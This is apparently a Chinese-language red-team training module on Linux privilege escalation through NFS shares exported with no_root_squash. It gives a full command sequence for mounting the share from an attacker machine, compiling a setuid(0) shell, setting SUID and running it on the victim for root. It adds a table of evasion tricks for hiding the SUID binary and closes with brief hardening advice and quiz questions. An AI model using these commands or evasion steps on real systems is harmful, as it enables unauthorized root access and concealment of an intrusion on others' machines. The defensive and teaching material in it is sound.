# R18.6 Linux 網路檔案系統 NFS no_root_squash 特權掛載提權 (NFS No Root Squash)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Linux 網路檔案系統 NFS no_root_squash 特權掛載提權** 的物理本質為**利用 Linux NFS 共享配置檔案 (`/etc/exports`) 中錯誤聲明的 `no_root_squash` 選項，該選項關閉了預設的安全降權機制（Root Squashing），允許客戶端以本機 `root` (UID 0) 身分掛載遠端共享目錄時，遠端 NFS 伺服器直接信任該 UID 0 身份而不將其映射為低特權的 `nobody` 帳戶**。在紅隊實戰中，若攻擊者在內部網路或目標主機上發現此配置，只需從本機以 root 權限向該共享目錄寫入一個帶有 SUID 屬性 (`chmod +s`) 的二進位程式，隨後在目標受害者終端以普通使用者身分執行該二進位檔，即可實現無密碼瞬時提權。

```
[取得低特權 Linux 本機帳號] ── 檢視 /etc/exports 或以 showmount -e 查詢共享目錄
                                     │
                                     ▼ 發現導出選項包含: *(rw,no_root_squash)
┌────────────────────────────────────┴───────────────────────────────────────────┐
│ 1. 預設安全行為 (root_squash): 客戶端 root 寫入檔案自動被降權為 nobody:nobody   │
│ 2. 脆弱配置 (no_root_squash): 客戶端 root 寫入檔案在伺服端依然屬於 root:root!    │
│ 3. 核心突破點: 客戶端具有完全 root 控制權，可在本機為共享目錄檔案赋予 SUID (4755)│
└────────────────────────────────────┬───────────────────────────────────────────┘
                                     ▼
[攻擊者在本機掛載 NFS 共享] ─────────► mount -t nfs <target>:/shared /mnt
                                     │
                                     ▼ 編譯特權 Shell: cp /bin/bash /mnt/rootbash
[在本機設定特權屬性] ────────────────► chmod +s /mnt/rootbash
                                     │
                                     ▼ 回到受害者目標主機，普通使用者直接執行
[在目標主機執行: /shared/rootbash -p] ──► 成功取得 root (EUID 0) 特權！
```

## 🔬 第一動：NFS 協定、RPC.Mountd 與 Root Squashing 物理安全機制 (Mechanics & RPC Structs)

### 1. Root Squashing 安全機制的物理設計
NFS (Network File System) 基於 Sun RPC 協定運作：
- 當遠端客戶端發起 NFS RPC 調用時，封包的 `AUTH_SYS` 認證憑證包含客戶端傳入的 UID 和 GID。
- **預設安全機制 (Root Squash)**：伺服器核心在處理請求時，若發現客戶端 UID=0 (root)，會強制將其映射（Squash）為無害的虛擬帳號 `nobody` (UID 65534)，杜絕客戶端以特權覆寫伺服器檔案。
- **致命弱點 (no_root_squash)**：管理員顯式聲明 `no_root_squash`，核心完全信任客戶端的 UID 0，允許客戶端隨意以 root 身份寫入、刪除甚至**保留 SUID/SGID 特權屬性**！

### 2. 武器化掛載與 SUID 植入打擊指令庫
```bash
# 1. 在攻擊者具備 root 權限的機台建立掛載點並掛載
mkdir -p /mnt/nfs_exploit
mount -t nfs -o vers=3 192.168.1.100:/shared /mnt/nfs_exploit

# 2. 編寫或拷貝一個特權 Shell 載荷至掛載目錄
cat << 'EOF' > /mnt/nfs_exploit/suid_shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
EOF

# 3. 在攻擊者機台編譯並賦予 SUID 屬性 (因為是 no_root_squash，檔案所有者為 root)
gcc /mnt/nfs_exploit/suid_shell.c -o /mnt/nfs_exploit/suid_shell
chmod 4755 /mnt/nfs_exploit/suid_shell

# 4. 回到受害目標主機的受限終端，直接執行該檔案完成提權
/shared/suid_shell
```

### 1. NFS 提權防禦規避策略表
| 規避面向 | 原始觸發特徵 | 變形隱蔽手法 | 原理解析 |
| :--- | :--- | :--- | :--- |
| **磁碟落盤特徵** | 新增可疑檔名 `suid_shell` 容易被排查 | 覆寫既有合法二進位檔或命名為 `.hidden` | 偽裝為正常業務腳本或隱藏檔案，規避定期巡檢 |

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **強制啟用 `root_squash` 與 `all_squash`**：
   - 編輯 `/etc/exports`，確保所有共用項目一律使用 `root_squash`（或更安全的 `all_squash`），禁止出現 `no_root_squash`。
2. **本機掛載點添加 `nosuid` 選項**：
   - 在客戶端掛載任何遠端 NFS 目錄時，在 `/etc/fstab` 或掛載命令中強制加入 `nosuid`，核心將自動忽略該目錄內任何 SUID 標記。

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：NFS 中的 `root_squash` 選項在網路檔案傳輸中扮演何種安全防禦角色？**
  - **戰術思維**：防止遠端客戶端以其本機的 root 權限隨意在伺服器寫入特權檔案；伺服器在接收到 UID 0 請求時，會自動將其身分降權映射為 nobody 帳戶。
- [ ] **Q2：若目標系統存在 `no_root_squash`，攻擊者為何需要在自己受控的客戶端上操作？**
  - **戰術思維**：因為在受害主機上攻擊者只有普通使用者權限，無法執行 `chown root` 或 `chmod +s`；但在攻擊者自己的機器上擁有絕對 root 權限，可賦予檔案特權屬性再同步回伺服端。
- [ ] **Q3：若 NFS 目錄在掛載時使用了 `nosuid` 參數，`no_root_squash` 提權還能成功嗎？**
  - **戰術思維**：無法直接透過 SUID 提權。`nosuid` 會告知核心即使檔案包含 SUID 標記，執行時也不得提升 EUID；此時可改為尋找該目錄下的排程腳本進行覆寫。
- [ ] **Q4：在 Windows 機器上是否也能掛載 Linux 的 NFS 共享目錄進行提權素材製作？**
  - **戰術思維**：可以。Windows 企業版可安裝「NFS 用戶端」，並在註冊表中自定義 Client UID/GID 為 0，同樣能向 Linux NFS 伺服器發送特權寫入請求。
- [ ] **Q5：藍隊應如何排查內部網路上是否存在配置不當的 NFS 共享服務？**
  - **戰術思維**：使用 nmap 的 `nfs-showmount` 或 `nfs-ls` 腳本全網掃描 2049 埠，並審查每台主機的 `/etc/exports` 是否包含不安全的星號萬用網段與 `no_root_squash`。
